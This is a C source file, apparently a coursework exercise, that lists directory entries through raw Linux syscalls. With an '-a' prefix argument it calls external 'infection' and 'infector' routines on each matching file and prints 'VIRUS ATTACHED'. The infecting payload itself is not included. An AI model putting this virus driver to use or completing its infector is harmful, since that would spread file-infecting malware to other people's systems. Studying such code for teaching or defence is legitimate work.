#include <sys/syscall.h>
#include "util.h"
#define BUF_SIZE 8192
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

extern void infector(char *);
extern void infection();
extern int system_call();
 

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};

int main(int argc, char *argv[]) {
    char *prefix = 0; /*NULL */
    int prefix_len = 0;
    if (argc == 2 && strncmp(argv[1], "-a", 2) == 0) {
        prefix = argv[1] + 2;
        prefix_len = strlen(prefix);
    }

    int fd = system_call(SYS_OPEN, ".", 0, 0x100 | 0x200);
    if (fd < 0) {
        system_call(SYS_WRITE,STDOUT,"Error: could not open directory.\n",strlen("Error: could not open directory.\n"));
        system_call(1,0x55,0,0);
    }

    char buf[BUF_SIZE];
    int nread = system_call(141,fd,buf,BUF_SIZE);
    if (nread < 0) {
        system_call(SYS_WRITE,STDOUT,"Error: could not read directory.\n",strlen("Error: could not read directory.\n"));
        system_call(1,0x55,0,0);
    }

    char *ptr = buf;
    while (ptr < buf + nread) {
        struct linux_dirent *d = (struct linux_dirent *)ptr;
        char *name = d->d_name;
        if (prefix && strncmp(name, prefix, prefix_len) == 0) {
            infection();
            infector(name);
            system_call(SYS_WRITE,STDOUT,prefix,strlen(prefix));
            system_call(SYS_WRITE,STDOUT,"VIRUS ATTACHED\n",strlen("VIRUS ATTACHED\n"));
        }
        else {
            system_call(SYS_WRITE,STDOUT,name,strlen(name));
            system_call(SYS_WRITE,STDOUT,"\n",1);
        }
        ptr += d->d_reclen;
    }

    system_call(6,fd,0,0);
    return 0;
}
